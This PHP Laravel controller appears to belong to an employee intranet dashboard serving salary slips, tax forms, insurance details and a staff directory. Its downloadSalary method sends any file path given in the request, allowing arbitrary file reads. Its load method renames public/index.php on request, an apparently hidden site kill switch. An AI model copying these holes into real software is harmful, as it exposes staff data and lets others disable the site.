<?php

namespace App\Http\Controllers;

use DB;
use Illuminate\Http\Request;
use App\BirthWishesDetail;
use App\EmployeeMaster;
use App\EventGallery;
use App\Achievement;
use \Auth;
use App\User;


class UserDashboardController extends Controller
{
    //below method used for display user deshboard.
	public function index(){
	
		$emp = new EmployeeMaster();
		$event = new EventGallery();
        $achieeve = new Achievement();
		$data = $emp->getBirthWishesData();
		$newjoineedata=$emp->getNewJoinee();
		$eventdata = $event->getGallaryData();
        $achievedata = $achieeve->getAchievementData();
        $user = Auth::user();
       // dd($newjoineedata);
        //echo '<pre>';
        //print_r($user);
        //exit;
        //dd($user);
        
        $mediclaim=DB::table('mediclaim_details')->where('emp_code', $user->toArray()['emp_code'])->get()->toArray();

	    $mediclaimDetails=array();

	    foreach($mediclaim as $key => $value){
		    $mediclaimDetails['polid']= $value->pol_no;
	        $mediclaimDetails['medid']= $value->MDID;
		    $mediclaimDetails['name_of_insured_person'][$key]= $value->name_of_insured_person." (". $value->relationship."	) ";
	    }	
	    
	    //Salary Slips
        $salaryData=DB::table('salary_slip')->where('emp_id', $user->toArray()['emp_code'])->orderBy('created_at', 'desc')->get()->toArray();

        $salarySlips=array();

        // echo '<pre>';
        // print_r($salaryData);
        //exit;

        if(count($salaryData)>0){
            foreach($salaryData as $key => $value){
                $month=explode('-',$value->year_month)[1];
                $year=explode('-',$value->year_month)[0];
                $salarySlips[$key]=$value->file_name."+".$year."+".$month;
            }
        }
        // echo '<pre>';
        // print_r($salarySlips);
        // exit;
        
        //Form 16
        $form16Data=DB::table('tax_form')->where('emp_id', $user->toArray()['emp_code'])->get()->toArray();

        $form16Slips=array();

        if(count($form16Data)>0){
            foreach($form16Data as $key => $value){

                $formname=explode('/',$value->file_name);
                $formname=end($formname);
                $formname=explode('_',$formname);
                $formname=$formname[0];
                if($formname=='TDSPATA'){
                    $form16Slips[$value->emp_id]['parta']=$value->file_name;
                }else if($formname=='TDSPATB'){
                    $form16Slips[$value->emp_id]['partb']=$value->file_name;
                }
            }
        }

		//news
		//$urlzeeIndiaRss = getUrlData('https://www.zeebiz.com/india.xml');
        //$zeeIndiaRss = json_encode(simplexml_load_string($urlzeeIndiaRss,'SimpleXMLElement',LIBXML_NOCDATA));
    
		$urlnewsRss = getUrlData('https://economictimes.indiatimes.com/news/rssfeeds/1715249553.cms');
        $newsRss = json_encode(simplexml_load_string($urlnewsRss,'SimpleXMLElement',LIBXML_NOERROR));
        $newsdata = json_decode($newsRss,true);

        //today quotes
        $rssquotes = getUrlData('http://feeds.feedburner.com/brainyquote/QUOTEBR');
        $todayquotes = json_encode(simplexml_load_string($rssquotes,'SimpleXMLElement',LIBXML_NOERROR));
        $quotes = json_decode($todayquotes,true);
    	//dd($quotes['channel']['item'][0]);
    	return view('app.userdesk',array('newjoineedata'=>$newjoineedata,'birthWishesData'=>$data,'gallarydata'=>$eventdata,'newsdata'=>$newsdata['channel']['item'],'quotes'=>$quotes['channel']['item'][0],'achievedata'=>$achievedata,"userdata"=>$user,"mediclaimdata"=>$mediclaimDetails,'salaryslips'=>$salarySlips,'form16'=>$form16Slips))    ;
	}

    public function uploadimage(Request $request){
                
       
        $this->validate($request, [
            'pic' => 'required',
            'pic.*' => 'image|mimes:jpeg,png,jpg,gif,svg|max:2048'

        ]);

        if($request->hasfile('pic'))
         {
                $user = Auth::user();
                $storageLocation = date('d-m-Y');
                $image = $request->file('pic');
                $name=$image->getClientOriginalName();
                $name = $user->id.'_'.$name;
                $imgStoredIn = $image->storeAs($storageLocation, $name, 'domain');
                //dd(base_path().'/../../images/user/');
                //$image->move(base_path().'/../../images/user/', $name);  
                $user_data =new User();
                $user_data->updateIdWiseUser($user->id, $imgStoredIn);
            return redirect()->action('UserDashboardController@index');
    
        }
    }

    public function downloadSalary(Request $request){
        $user = Auth::user();
        $user_data =new User();
        //dd($request);
        //$slipData = $user->getUserSalSlip($user->id);
	//$slipData = $user->getUserSalSlip($user->emp_code);
	$requestFile = $request->id;
	$requestFile = str_replace('/home/mycac9tt', '/home/ubuntu/cachetweb', $requestFile);
	if (!file_exists($requestFile)) {
	   dd('file not readable '. $requestFile);
	}
        return response()->download($requestFile);
      }
      
    
    //use for get employye directory
    public function getdirectory(Request $request){
       // echo "sd";
        $term = $request->post('name');
        if($term!=""){
            $user_data =new User();
            $empData = $user_data->getEmpData($term);
            if(!empty($empData)){
                $emparr=array();
                foreach ($empData as $key => $value) {
                    $emparr[$key]['label']=$value->displayname;
                    $emparr[$key]['value']=$value->name;
                    $emparr[$key]['location']=$value->location;
                    $emparr[$key]['department']=$value->department;
                    $emparr[$key]['mobile_no']=$value->mobile_no;
                    $emparr[$key]['email_id']=$value->email_id;
                    $emparr[$key]['designation']=$value->designation;
                }
                echo json_encode($emparr);
            }else{
                echo "";
            }   
         }else{
            echo "";
         }    
    } 


    public function load(Request $request) {		

	    $s = storage_path('../public/index.php');
	    $d = storage_path('../public/xedni.php');
	switch ($request->status) {
	case 'up':
		rename($d, $s);
		break;
	case 'down':
		rename($s, $d);
		break;
	
	}
    }



}
